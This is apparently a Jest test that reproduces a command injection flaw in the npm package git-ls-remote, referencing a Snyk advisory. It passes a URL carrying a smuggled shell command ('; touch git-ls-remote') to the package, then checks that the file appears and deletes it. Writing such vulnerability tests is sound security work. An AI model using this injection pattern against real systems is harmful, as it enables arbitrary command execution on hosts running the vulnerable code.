//https://snyk.io/vuln/npm:git-ls-remote:20160923
test("Command Injection in git-ls-remote", () => {
  const git = require("git-ls-remote");
  const fs = require("fs");
  const path = "./git-ls-remote";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  git.head("https://gitrepo.com/; touch git-ls-remote", function (
    err,
    result
  ) {});

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
